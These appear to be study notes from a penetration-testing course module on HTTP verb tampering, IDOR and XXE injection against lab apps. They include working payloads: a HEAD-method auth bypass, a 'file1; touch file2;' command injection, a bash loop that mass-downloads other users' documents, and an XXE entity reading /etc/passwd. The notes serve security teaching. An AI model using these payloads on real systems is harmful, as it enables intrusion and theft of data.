# Web Attacks
## Introduction to Web Attacks

| **Category** | **Details** |
|---|---|
| **Context** | Web applications are becoming very common and utilized for most businesses; protecting them against malicious attacks becomes more critical; as web applications become more complex and advanced, so do the types of attacks; this leads to a vast attack surface; web attacks are the most common types of attacks against companies; protecting web applications is a top priority for any IT department |
| **Impact** | Attacking external-facing web applications may result in compromise of the business's internal network, potentially leading to stolen assets or disrupted services; may cause a financial disaster; even if a company has no external-facing web applications, they likely utilize internal web applications or external-facing API endpoints — both vulnerable to the same types of attacks and can be leveraged to achieve the same goals |
| **Module scope** | Other HTB Academy modules covered various web application topics and exploitation techniques; this module covers three other web attacks found in any web application that may lead to compromise; discusses how to detect, exploit, and prevent each |
| **Attack 1 — HTTP Verb Tampering** | Exploits web servers that accept many HTTP verbs and methods; exploited by sending malicious requests using unexpected methods, which may lead to bypassing the web application's authorization mechanism or even bypassing its security controls against other web attacks; one of many HTTP attacks used to exploit web server configurations by sending malicious HTTP requests |
| **Attack 2 — Insecure Direct Object References (IDOR)** | Among the most common web vulnerabilities; can lead to accessing data that should not be accessible by attackers; common due to the lack of a solid access control system on the back-end; web applications store users' files and information and may use sequential numbers or user IDs to identify each item; if the web application lacks a robust access control mechanism and exposes direct references to files and resources, we may access other users' files and information by simply guessing or calculating their file IDs |
| **Attack 3 — XML External Entity (XXE) Injection** | Many web applications process XML data as part of their functionality; if a web application utilizes outdated XML libraries to parse and process XML input data from the front-end user, it may be possible to send malicious XML data to disclose local files stored on the back-end server; these files may be configuration files containing sensitive information (passwords) or even the source code of the web application, enabling a Whitebox Penetration Test to identify more vulnerabilities; XXE attacks can even be leveraged to steal the hosting server's credentials, compromising the entire server and allowing for remote code execution |

# HTTP Verb Tampering
## Intro to HTTP Verb Tampering

| **Category** | **Details** |
|---|---|
| **HTTP protocol — basics** | Works by accepting various HTTP methods as verbs at the beginning of an HTTP request; depending on web server configuration, web applications may be scripted to accept certain HTTP methods for various functionalities and perform a particular action based on the request type |
| **HTTP methods — programmer assumptions** | Programmers mainly consider the two most commonly used HTTP methods, **GET** and **POST**; any client can send any other methods in HTTP requests and see how the web server handles them |
| **HTTP methods — secure vs insecure behavior** | If both the web application and back-end web server are configured only to accept GET and POST, sending a different request causes a web server error page (not a severe vulnerability itself, other than bad UX and potential info disclosure); if web server configurations are not restricted to only accept required HTTP methods and the web application is not developed to handle other types (e.g., HEAD, PUT), we may exploit this insecure configuration to gain access to functionalities we do not have access to, or even bypass certain security controls |
| **HTTP Verb Tampering — overview** | HTTP has **9 different verbs** that can be accepted as HTTP methods by web servers; other than GET and POST, commonly used HTTP verbs include HEAD, PUT, DELETE, OPTIONS, PATCH |
| **Verb — HEAD** | Identical to a GET request, but its response only contains the headers, without the response body |
| **Verb — PUT** | Writes the request payload to the specified location |
| **Verb — DELETE** | Deletes the resource at the specified location |
| **Verb — OPTIONS** | Shows different options accepted by a web server, like accepted HTTP verbs |
| **Verb — PATCH** | Apply partial modifications to the resource at the specified location |
| **Why critical** | Some methods can perform very sensitive functionalities, like writing (PUT) or deleting (DELETE) files to the webroot directory on the back-end server; if a web server is not securely configured to manage these methods, we can use them to gain control over the back-end server; what makes HTTP Verb Tampering more common (and hence more critical) is that it is caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability |
| **Insecure Configurations — overview** | Insecure web server configurations cause the first type of HTTP Verb Tampering vulnerabilities; a web server's authentication configuration may be limited to specific HTTP methods, leaving some HTTP methods accessible without authentication |
| **Insecure Configurations — example** | A system admin may use the following configuration to require authentication on a particular web page: `<Limit GET POST>`<br>`    Require valid-user`<br>`</Limit>`; even though the configuration specifies both GET and POST requests for the authentication method, an attacker may still use a different HTTP method (like HEAD) to bypass this authentication mechanism altogether, leading to an authentication bypass and allowing attackers to access web pages and domains they should not have access to |
| **Insecure Coding — overview** | Insecure coding practices cause the other type of HTTP Verb Tampering vulnerabilities (though some may not consider this Verb Tampering); occurs when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter |
| **Insecure Coding — example** | If a web page was found vulnerable to SQL Injection, and the back-end developer mitigated it by applying input sanitization filters: `$pattern = "/^[A-Za-z\s]+$/";`<br>`if(preg_match($pattern, $_GET["code"])) {`<br>`    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";`<br>`    ...SNIP...`<br>`}`; the sanitization filter is only being tested on the **GET parameter**; if the GET requests do not contain any bad characters, then the query would be executed; however, when the query is executed, the `$_REQUEST["code"]` parameters are being used, which may also contain POST parameters, leading to an inconsistency in the use of HTTP Verbs; an attacker may use a POST request to perform SQL injection, in which case the GET parameters would be empty (will not include any bad characters); the request would pass the security filter, which would make the function still vulnerable to SQL Injection |
| **Prevalence** | Both vulnerabilities are found in public, but the second one is much more common, as it is due to mistakes made in coding, while the first is usually avoided by secure web server configurations, as documentation often cautions against it |
| **Next** | See examples of both types and how to exploit them |

## Bypassing Basic Authentication

| **Category** | **Details** |
|---|---|
| **Overview** | Exploiting HTTP Verb Tampering vulnerabilities is usually straightforward — try alternate HTTP methods to see how they are handled by the web server and web application; many automated vulnerability scanning tools can identify HTTP Verb Tampering caused by insecure server configurations, but usually miss those caused by insecure coding (need active testing to see whether security filters can be bypassed) |
| **Vulnerability type** | The first type of HTTP Verb Tampering vulnerability is mainly caused by **insecure web server configurations**; exploiting it can allow bypassing the HTTP Basic Authentication prompt on certain pages |
| **Identify — application** | Start the exercise: a basic **File Manager** web application, where we can add new files by typing their names and hitting enter; interface shows input for new file name and links to `test` and `notes.txt` |
| **Identify — restricted functionality** | Trying to delete all files by clicking the red **Reset** button shows this functionality seems restricted to authenticated users only — get an HTTP Basic Auth prompt |
| **Identify — without credentials** | No credentials → get a **401 Unauthorized** page at `http://SERVER_IP:PORT/admin/reset.php` |
| **Identify — scope of restriction** | Examine the HTTP request after clicking Reset or the URL the button navigates to → `/admin/reset.php`; either the `/admin` directory is restricted or only `/admin/reset.php`; visiting `/admin` does prompt to log in again → the full `/admin` directory is restricted |
| **Exploit — identify request method** | Intercept the request in Burp Suite and examine it: HTTP **GET** request to `/admin/reset.php` |
| **Exploit — try POST** | As the page uses a GET request, send a POST request to see whether the web page allows POST requests (i.e., whether Authentication covers POST requests); right-click the intercepted request → **Change Request Method** → automatically changes to POST; click **Forward** and examine the page — still prompted to log in and get 401 Unauthorized without credentials |
| **Exploit — try HEAD** | Web server configurations cover both GET and POST; utilize many other HTTP methods, most notably **HEAD** — identical to GET but does not return the body in the HTTP response; if successful, may not receive any output, but the reset function should still get executed |
| **Exploit — check accepted methods** | Send an OPTIONS request: `curl -i -X OPTIONS http://SERVER_IP:PORT/` → response: `HTTP/1.1 200 OK`, `Server: Apache/2.4.41 (Ubuntu)`, `Allow: POST,OPTIONS,HEAD,GET`, `Content-Length: 0`, `Content-Type: httpd/unix-directory` — the web server accepts HEAD requests (default configuration for many web servers) |
| **Exploit — use HEAD** | Intercept the reset request again, change POST to **HEAD**, and forward the request → no longer get a login prompt or 401 Unauthorized page; get an empty output instead, as expected with a HEAD request |
| **Exploit — result** | Go back to the File Manager web application → all files have indeed been deleted → successfully triggered the Reset functionality without having admin access or any credentials |

## Bypassing Security Filters

| **Category** | **Details** |
|---|---|
| **Overview** | The other and more common type of HTTP Verb Tampering vulnerability is caused by **insecure coding errors** during web application development, leading to the web application not covering all HTTP methods in certain functionalities; commonly found in security filters that detect malicious requests; e.g., if a security filter detects injection vulnerabilities and only checks POST parameters (`$_POST['parameter']`), it may be possible to bypass it by simply changing the request method to GET |
| **Identify — application** | In the File Manager web application, try to create a new file name with special characters (e.g., `test;`) → get the message: **"Malicious Request Denied!"** |
| **Identify — meaning** | The message shows the web application uses certain filters on the back-end to identify injection attempts and block malicious requests; no matter what is tried, the web application properly blocks requests and is secured against injection attempts; however, an HTTP Verb Tampering attack may bypass the security filter altogether |
| **Exploit — intercept and change method** | Intercept the request in Burp Suite → use **Change Request Method** to change it to another method (e.g., GET) → this time, did not get the "Malicious Request Denied!" message, and the file was successfully created (links to `notes.txt` and `test`) |
| **Exploit — confirm filter bypass** | To confirm whether the security filter was bypassed, attempt exploiting the vulnerability the filter protects: a **Command Injection** vulnerability in this case; inject a command that creates two files and check whether both files were created; use the file name `file1; touch file2;` in the attack |
| **Exploit — change to POST** | Once again change the request method to a POST request; intercepted request shows `filename` parameter `file1%3B+touch+file2%3B` with headers including Host, Cache-Control, User-Agent, and Connection |
| **Exploit — result** | After sending the request, both `file1` and `file2` were created (links to `file2`, `notes.txt`, `test`, and `file1`) → successfully bypassed the filter through an HTTP Verb Tampering vulnerability and achieved command injection |
| **Takeaway** | Without the HTTP Verb Tampering vulnerability, the web application may have been secure against Command Injection attacks; this vulnerability allowed bypassing the filters in place altogether |

# IDOR
## Intro to IDOR

| **Category** | **Details** |
|---|---|
| **Overview** | Insecure Direct Object References (IDOR) vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application; occur when a web application exposes a direct reference to an object (a file or database resource) that the end-user can directly control to obtain access to other similar objects; if any user can access any resource due to the lack of a solid access control system, the system is considered vulnerable |
| **Why prevalent** | Building a solid access control system is very challenging; automating the process of identifying weaknesses in access control systems is also quite difficult, which may lead to these vulnerabilities going unidentified until they reach production |
| **Example scenario** | If users request access to a file they recently uploaded, they may get a link like `download.php?file_id=123`; since the link directly references the file with `file_id=123`, trying to access another file (which may not belong to us) with `download.php?file_id=124` may work if the web application does not have a proper access control system on the back-end; in many cases, the ID is easily guessable, making it possible to retrieve many files or resources we should not have access to based on our permissions |
| **What Makes an IDOR Vulnerability — overview** | Just exposing a direct reference to an internal object or resource is not a vulnerability in itself; however, this may make it possible to exploit another vulnerability: a weak access control system |
| **What Makes an IDOR Vulnerability — explanation** | Many web applications restrict users from accessing resources by restricting them from accessing the pages, functions, and APIs that can retrieve these resources; if a user somehow got access to these pages (e.g., through a shared/guessed link), would they still be able to access the same resources by simply having the link? If the web application did not have an access control system on the back-end that compares the user's authentication to the resource's access list, they might be able to |
| **Access control implementations** | Many ways of implementing a solid access control system, like having a **Role-Based Access Control (RBAC)** system; the main takeaway is that an IDOR vulnerability mainly exists due to the lack of access control on the back-end; if a user had direct references to objects in a web application that lacks access control, it would be possible for attackers to view or modify other users' data |
| **Why many applications are vulnerable** | Many developers ignore building an access control system; hence most web applications and mobile applications are left unprotected on the back-end; in such applications, all users may have arbitrary access to all other users' data on the back-end; the only thing stopping users from accessing other users' data would be the front-end implementation, which is designed to only show the user's data; manually manipulating HTTP requests may reveal that all users have full access to all data, leading to a successful attack |
| **Criticality** | Makes IDOR vulnerabilities among the most critical vulnerabilities for any web or mobile application — not only due to exposing direct object references but mainly due to a lack of a solid access control system; even a basic access control system can be challenging to develop; a comprehensive access control system covering the entire web application without interfering with its functions might be even more difficult; this is why IDOR/Access Control vulnerabilities are found even in very large web applications, like Facebook, Instagram, and Twitter |
| **Impact — overview** | IDOR vulnerabilities can have a significant impact on web applications |
| **Impact — IDOR Information Disclosure** | The most basic example is accessing private files and resources of other users that should not be accessible to us, like personal files or credit card data; depending on the nature of the exposed direct reference, the vulnerability may even allow the modification or deletion of other users' data, which may lead to a complete account takeover |
| **Impact — attacker process** | Once an attacker identifies the direct references (which may be database IDs or URL parameters), they can start testing specific patterns to see whether they can gain access to any data and may eventually understand how to extract or modify data for any arbitrary user |
| **Impact — IDOR Insecure Function Calls** | May also lead to the elevation of user privileges from a standard user to an administrator user; e.g., many web applications expose URL parameters or APIs for admin-only functions in the front-end code and disable these functions for non-admin users; however, if we had access to such parameters or APIs, we may call them with our standard user privileges; if the back-end did not explicitly deny non-admin users from calling these functions, we may be able to perform unauthorized administrative operations (like changing users' passwords or granting users certain roles), which may eventually lead to a total takeover of the entire web application |

## Identifying IDORs

| **Category** | **Details** |
|---|---|
| **URL Parameters & APIs** | The first step of exploiting IDOR vulnerabilities is identifying Direct Object References; whenever receiving a specific file or resource, study the HTTP requests to look for URL parameters or APIs with an object reference (e.g., `?uid=1` or `?filename=file_1.pdf`); mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies |
| **URL Parameters & APIs — basic testing** | In the most basic cases, try incrementing the values of the object references to retrieve other data (e.g., `?uid=2` or `?filename=file_2.pdf`); can also use a fuzzing application to try thousands of variations and see if they return any data; any successful hits to files that are not our own would indicate an IDOR vulnerability |
| **AJAX Calls — overview** | May also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls; some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role |
| **AJAX Calls — example scenario** | If we did not have an admin account, only user-level functions would be used, while admin functions would be disabled; however, we may still find the admin functions in the front-end JavaScript code and may identify AJAX calls to specific end-points or APIs containing direct object references; if we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities |
| **AJAX Calls — scope** | Not unique to admin functions — can also be any functions or calls that may not be found through monitoring HTTP requests |
| **AJAX Calls — example code** | `function changeUserPassword() {`<br>`    $.ajax({`<br>`        url:"change_password.php",`<br>`        type: "post",`<br>`        dataType: "json",`<br>`        data: {uid: user.uid, password: user.password, is_admin: is_admin},`<br>`        success:function(result){`<br>`            //`<br>`        }`<br>`    });`<br>`}` |
| **AJAX Calls — testing** | The above function may never be called when using the web application as a non-admin user; however, if located in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate it is vulnerable to IDOR; can do the same with back-end code if we have access to it (e.g., open-source web applications) |
| **Understand Hashing/Encoding — overview** | Some web applications may not use simple sequential numbers as object references but may encode or hash the reference instead; if we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end |
| **Hashing/Encoding — encoded example (Base64)** | If the reference was encoded with a common encoder (e.g., Base64), we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data; e.g., `?filename=ZmlsZV8xMjMucGRm` → decode to `file_123.pdf` → encode a different reference (e.g., `file_124.pdf`) → `?filename=ZmlsZV8xMjQucGRm` → may reveal an IDOR vulnerability if we can retrieve any data |
| **Hashing/Encoding — hashed example** | Object reference may be hashed, like `download.php?filename=c81e728d9d4c2f636f067f89cc14862c`; at first glance, may think this is secure, as it is not using any clear text or easy encoding; however, if we look at the source code, we may see what is being hashed before the API call is made |
| **Hashing/Encoding — source code example** | `$.ajax({`<br>`    url:"download.php",`<br>`    type: "post",`<br>`    dataType: "json",`<br>`    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},`<br>`    success:function(result){`<br>`        //`<br>`    }`<br>`});` |
| **Hashing/Encoding — hashed attack** | Code uses the filename and hashes it with `CryptoJS.MD5`, making it easy to calculate the filename for other potential files; otherwise, may manually try to identify the hashing algorithm being used (e.g., with hash identifier tools) and then hash the filename to see if it matches the used hash; once we can calculate hashes for other files, we may try downloading them, which may reveal an IDOR vulnerability if we can download any files that do not belong to us |
| **Compare User Roles — overview** | If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references; this may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data |
| **Compare User Roles — example** | If we had access to two different users, one of which can view their salary after making the following API call: `{`<br>`  "attributes" : ` `{`<br>`      "type" : "salary",`<br>`      "url" : "/services/data/salaries/users/1"`<br>`    },`<br>`  "Id" : "1",`<br>`  "Name" : "User1"`<br>`}`; the second user may not have all of these API parameters to replicate the call and should not be able to make the same call as User1; however, with these details at hand, we can try repeating the same API call while logged in as User2 to see if the web application returns anything |
| **Compare User Roles — conclusion** | Such cases may work if the web application only requires a valid logged-in session to make the API call but has no access control on the back-end to compare the caller's session with the data being called; if we can calculate the API parameters for other users, this would be an IDOR vulnerability; even if we could not calculate the API parameters for other users, we would still have identified a vulnerability in the back-end access control system and may start looking for other object references to exploit |

## Mass IDOR Enumeration

| **Category** | **Details** |
|---|---|
| **Context** | Exploiting IDOR vulnerabilities is easy in some instances but can be very challenging in others; once a potential IDOR is identified, start testing with basic techniques to see whether it would expose any other data; advanced IDOR attacks require better understanding of how the web application works, how it calculates object references, and how its access control system works |
| **Scope** | Various techniques of exploiting IDOR vulnerabilities — from basic enumeration to mass data gathering, to user privilege escalation |
| **Insecure Parameters — application** | The exercise is an **Employee Manager** web application hosting employee records; web application assumes we are logged in as an employee with user id `uid=1` to simplify things (real web application would require login, but the rest of the attack is the same); clicking on Documents redirects to `/documents.php` |
| **Insecure Parameters — Documents page** | `http://SERVER_IP:PORT/documents.php?uid=1` → several documents belonging to our user (files uploaded by our user or set by another department, e.g., HR); file links have individual names: `/documents/Invoice_1_09_2021.pdf`, `/documents/Report_1_10_2021.pdf` |
| **Insecure Parameters — predictable naming** | Files use a predictable naming pattern — user uid and month/year as part of the file name — may allow fuzzing files for other users; this is the most basic type of IDOR vulnerability, called **static file IDOR**; however, to successfully fuzz other files, we would assume they all start with `Invoice` or `Report`, which may reveal some files but not all; look for a more solid IDOR vulnerability |
| **Insecure Parameters — uid GET parameter** | The page sets our uid with a GET parameter in the URL as `documents.php?uid=1`; if the web application uses this `uid` GET parameter as a direct reference to employee records it should show, we may be able to view other employees' documents by simply changing this value; if the back-end has a proper access control system, we will get some form of Access Denied; given that the web application passes our uid in clear text as a direct reference, this may indicate poor web application design, leading to arbitrary access to employee records |
| **Insecure Parameters — test uid=2** | Changing `uid` to `?uid=2` — no noticeable difference in page output, still getting the same list of documents; must be attentive to page details during any web pentest and always keep an eye on the source code and page size; looking at the linked files or clicking on them reveals they are indeed different files belonging to the employee with `uid=2`: `/documents/Invoice_2_08_2020.pdf`, `/documents/Report_2_12_2020.pdf` |
| **Insecure Parameters — common mistake** | Common mistake in web applications suffering from IDOR — place the parameter that controls which user documents to show under our control while having no access control system on the back-end; another example is using a filter parameter to only display a specific user's documents (e.g., `uid_filter=1`), which can be manipulated to show other users' documents or even completely removed to show all documents at once |
| **Mass Enumeration — overview** | Manually accessing other employee documents with `uid=3`, `uid=4`, and so on is not efficient in a real work environment with hundreds or thousands of employees; use a tool like Burp Intruder or ZAP Fuzzer to retrieve all files, or write a small bash script to download all files |
| **Mass Enumeration — inspect source** | Click CTRL+SHIFT+C in Firefox to enable the element inspector, then click any link to view its HTML source code: `<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>`, `<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>` |
| **Mass Enumeration — grep for links** | Pick any unique word to grep the link of the file; each link starts with `<li class='pure-tree_link'>`, so curl the page and grep for this line: `curl -s "http://SERVER_IP:PORT/documents.php?uid=3" \| grep "<li class='pure-tree_link'>"` → outputs the two document links |
| **Mass Enumeration — regex extraction** | Use a Regex pattern that matches strings between `/document` and `.pdf` with grep to only get the document links: `curl -s "http://SERVER_IP:PORT/documents.php?uid=3" \| grep -oP "/documents.*?.pdf"` → `/documents/Invoice_3_06_2020.pdf`, `/documents/Report_3_01_2020.pdf` |
| **Mass Enumeration — bash script** | `#!/bin/bash`<br>`url="http://SERVER_IP:PORT"`<br>`for i in {1..10}; do`<br>`        for link in $(curl -s "$url/documents.php?uid=$i" \| grep -oP "/documents.*?.pdf"); do`<br>`                wget -q $url/$link`<br>`        done`<br>`done` |
| **Mass Enumeration — result** | Running the script downloads all documents from all employees with uids between 1-10, successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees; this script is one example — try using a tool like Burp Intruder or ZAP Fuzzer, or write another Bash or PowerShell script to download all documents |

## Bypassing Encoded References

| **Category** | **Details** |
|---|---|
| **Context** | In the previous section, saw an IDOR using employee uids in clear text, making enumeration easy; in some cases, web applications make hashes or encode object references, making enumeration more difficult, but it may still be possible |
| **Scenario — application** | Go back to the Employee Manager web application to test the Contracts functionality: `http://SERVER_IP:PORT/contracts.php`; clicking on the `Employment_contract.pdf` file starts downloading it; intercepted request in Burp looks like: HTTP POST request to `/download.php` with `contract` parameter `cdd96d3cc73d1dbdaffa03cc6cd7339b` and headers including Host, Content-Length, User-Agent |
| **Scenario — data** | Sending a POST request to `download.php` with the following data: `contract=cdd96d3cc73d1dbdaffa03cc6cd7339b` |
| **Scenario — observation** | Using a `download.php` script to download files is common practice to avoid directly linking to files (which may be exploitable with multiple web attacks); in this case, the web application is not sending the direct reference in cleartext but appears to be hashing it in **MD5** format; hashes are one-way functions, so we cannot decode them to see their original values |
| **Attempt to identify hash** | Attempt to hash various values (uid, username, filename, and many others) and see if any of their MD5 hashes match the above value; if a match is found, we can replicate it for other users and collect their files; e.g., `echo -n 1 \| md5sum` → `c4ca4238a0b923820dcc509a6f75849b` — does not match; can attempt with various other fields, none matches; in advanced cases, may utilize **Burp Comparer** and fuzz various values to compare each to our hash; in this case, the MD5 hash could be for a unique value or combination of values, which would be very difficult to predict, making this direct reference a **Secure Direct Object Reference** — however, there's one fatal flaw in this web application |
| **Function Disclosure — overview** | Most modern web applications are developed using JavaScript frameworks (Angular, React, Vue.js); many web developers may make the mistake of performing sensitive functions on the **front-end**, which would expose them to attackers; e.g., if the above hash was being calculated on the front-end, we can study the function and replicate what it's doing to calculate the same hash — this is precisely the case in this web application |
| **Function Disclosure — source code** | Taking a look at the link in the source code, it is calling a JavaScript function with `javascript:downloadContract('1')`; looking at the `downloadContract()` function in the source code: `function downloadContract(uid) {`<br>`    $.redirect("/download.php", {`<br>`        contract: CryptoJS.MD5(btoa(uid)).toString(),`<br>`    }, "POST", "_self");`<br>`}` |
| **Function Disclosure — analysis** | The function appears to be sending a POST request with the `contract` parameter, which is what we saw above; the value it is sending is an MD5 hash using the `CryptoJS` library, which also matches the request we saw earlier; the value being hashed is `btoa(uid)` — the **base64 encoded string** of the `uid` variable, which is an input argument for the function; going back to the earlier link, it calls `downloadContract('1')` → the final value used in the POST request is the base64 encoded string of `1`, which was then MD5 hashed |
| **Test the technique** | Base64 encode `uid=1`, then hash it with MD5: `echo -n 1 \| base64 -w 0 \| md5sum` → `cdd96d3cc73d1dbdaffa03cc6cd7339b` — matches the hash in our request; successfully reversed the hashing technique used on the object references, turning them into IDORs |

# XML External Entity (XXE) Injection:
## Intro to XXE

| **Category** | **Details** |
|---|---|
| **XXE — overview** | XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions; can cause considerable damage to a web application and its back-end server — from disclosing sensitive files to shutting the back-end server down; considered one of the Top 10 Web Security Risks by OWASP |
| **XML — overview** | Extensible Markup Language is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications; not focused on displaying data but mostly on storing documents' data and representing data structures; XML documents are formed of element trees, where each element is essentially denoted by a tag; the first element is called the **root element**, while other elements are **child elements** |
| **XML — example document** | `<?xml version="1.0" encoding="UTF-8"?>`<br>`<email>`<br>`  <date>01-01-2022</date>`<br>`  <time>10:00 am UTC</time>`<br>`  <sender>john@inlanefreight.com</sender>`<br>`  <recipients>`<br>`    <to>HR@inlanefreight.com</to>`<br>`    <cc>`<br>`        <to>billing@inlanefreight.com</to>`<br>`        <to>payslips@inlanefreight.com</to>`<br>`    </cc>`<br>`  </recipients>`<br>`  <body>`<br>`  Hello,`<br>`      Kindly share with me the invoice for the payment made on January 1, 2022.`<br>`  Regards,`<br>`  John`<br>`  </body> ` `<br>`</email>` |
| **XML — key elements** | **Tag**: the keys of an XML document, usually wrapped with `</>` characters (e.g., `<date>`); **Entity**: XML variables, usually wrapped with `&/;` characters (e.g., `&lt;`); **Element**: the root element or any of its child elements, value stored between a start-tag and an end-tag (e.g., `<date>01-01-2022</date>`); **Attribute**: optional specifications for any element stored in the tags, which may be used by the XML parser (e.g., `version="1.0"/encoding="UTF-8"`); **Declaration**: usually the first line of an XML document, defines the XML version and encoding to use when parsing (e.g., `<?xml version="1.0" encoding="UTF-8"?>`) |
| **XML — special characters** | Some characters are used as part of XML document structure, like `<`, `>`, `&`, or `"`; if we need to use them in an XML document, replace them with their corresponding entity references (e.g., `&lt;`, `&gt;`, `&amp;`, `&quot;`); comments in XML documents between `<!--` and `-->`, similar to HTML documents |
| **XML DTD — overview** | Document Type Definition allows the validation of an XML document against a pre-defined document structure; the pre-defined structure can be defined in the document itself or in an external file |
| **XML DTD — example** | `<!DOCTYPE email [`<br>`  <!ELEMENT email (date, time, sender, recipients, body)>`<br>`  <!ELEMENT recipients (to, cc?)>`<br>`  <!ELEMENT cc (to*)>`<br>`  <!ELEMENT date (#PCDATA)>`<br>`  <!ELEMENT time (#PCDATA)>`<br>`  <!ELEMENT sender (#PCDATA)>`<br>`  <!ELEMENT to  (#PCDATA)>`<br>`  <!ELEMENT body (#PCDATA)>`<br>`]>` |
| **XML DTD — analysis** | The DTD declares the root `email` element with the `ELEMENT` type declaration and then denotes its child elements; each child element is also declared, where some also have child elements, while others may only contain raw data (denoted by `PCDATA`) |
| **XML DTD — placement** | The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line; otherwise, it can be stored in an external file (e.g., `email.dtd`) and referenced within the XML document with the `SYSTEM` keyword: `<?xml version="1.0" encoding="UTF-8"?>`<br>`<!DOCTYPE email SYSTEM "email.dtd">` |
| **XML DTD — reference via URL** | Possible to reference a DTD through a URL: `<?xml version="1.0" encoding="UTF-8"?>`<br>`<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">`; relatively similar to how HTML documents define and reference JavaScript and CSS scripts |
| **XML Entities — custom entities** | Define custom entities (XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data; done with the `ENTITY` keyword, followed by the entity name and its value: `<?xml version="1.0" encoding="UTF-8"?>`<br>`<!DOCTYPE email [`<br>`  <!ENTITY company "Inlane Freight">`<br>`]>` |
| **XML Entities — referencing** | Once defined, an entity can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g., `&company;`); whenever an entity is referenced, it will be replaced with its value by the XML parser |
| **XML Entities — external entities** | Most interestingly, we can reference **External XML Entities** with the `SYSTEM` keyword, followed by the external entity's path: `<?xml version="1.0" encoding="UTF-8"?>`<br>`<!DOCTYPE email [`<br>`  <!ENTITY company SYSTEM "http://localhost/company.txt">`<br>`  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">`<br>`]>` |
| **XML Entities — note on PUBLIC** | May also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources, used with publicly declared entities and standards, such as a language code (`lang="en"`); this module uses `SYSTEM`, but either should work in most cases |
| **XML Entities — how it works** | Works similarly to internal XML entities defined within documents; when referencing an external entity (e.g., `&signature;`), the parser will replace the entity with its value stored in the external file (e.g., `signature.txt`); when the XML file is parsed on the server-side (in cases like SOAP (XML) APIs or web forms), an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity |
| **Next** | See how to use External XML Entities to read local files or even perform more malicious actions |

## Local File Disclosure

| **Category** | **Details** |
|---|---|
| **Context** | When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities; if we can define new entities and have them displayed on the web page, we should also be able to define external entities and make them reference a local file, which when displayed should show us the content of that file on the back-end server |
| **Identifying — application** | Start the exercise, which has a Contact Form: `http://SERVER_IP:PORT/index.php`; fields for full name, email, phone number, and query; includes address, urgent enquiries phone number, and general support email |

| **Identifying — potential target** | The form appears to be sending data in an **XML format** to the web server, making this a potential XXE testing target; suppose the web application uses outdated XML libraries and does not apply filters or sanitization on XML input → may be able to exploit this XML form to read local files |
| **Identifying — baseline response** | Send the form without modification → response: HTTP/1.1 200 OK, message **"Check your email email@xxe.htbl for further instructions."**; the value of the `email` element is being displayed back to us on the page |
| **Identifying — displayed elements** | To print the content of an external file to the page, note which elements are being displayed, so we know which elements to inject into; in some cases, no elements may be displayed (covered in upcoming sections); for now, whatever value we place in the `<email></email>` element gets displayed in the HTTP response |
| **Identifying — test internal entity** | Define a new entity and use it as a variable in the `email` element: add after the first line in the XML input: `<!DOCTYPE email [`<br>`  <!ENTITY company "Inlane Freight">`<br>`]>`; note: the XML input had no DTD declared within the XML data itself or referenced externally, so we added a new DTD before defining our entity; if the DOCTYPE was already declared in the XML request, we would just add the ENTITY element to it |
| **Identifying — entity reference** | New XML entity `company` can be referenced with `&company;`; instead of using our email in the `email` element, use `&company;` → response: HTTP/1.1 200 OK, **"Check your email Inlane Freight for further instructions."** — the response used the entity value (Inlane Freight) instead of displaying `&company;`, indicating we may inject XML code; in contrast, a non-vulnerable web application would display `&company;` as a raw value; this confirms the web application is vulnerable to XXE |
| **Identifying — note on JSON** | Some web applications may default to a JSON format in HTTP request but may still accept other formats, including XML; even if a web app sends requests in JSON, try changing the `Content-Type` header to `application/xml` and convert the JSON data to XML with an online tool; if the web application accepts the request with XML data, we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability |
| **Reading Sensitive Files — external entity** | Define external XML entities by adding the `SYSTEM` keyword and the external reference path after it: `<!DOCTYPE email [`<br>`  <!ENTITY company SYSTEM "file:///etc/passwd">`<br>`]>` |
| **Reading Sensitive Files — result** | Send the modified request → response: HTTP/1.1 200 OK, displaying contents of `/etc/passwd`; successfully exploited the XXE vulnerability to read local files; enables reading sensitive files like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant access to the back-end server; refer to the File Inclusion / Directory Traversal module to see what attacks can be carried out through local file disclosure |
| **Reading Sensitive Files — Tip** | In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files |
| **Reading Source Code — overview** | Another benefit of local file disclosure is obtaining the source code of the web application; allows performing a **Whitebox Penetration Test** to unveil more vulnerabilities, or at the very least reveal secret configurations like database passwords or API keys |
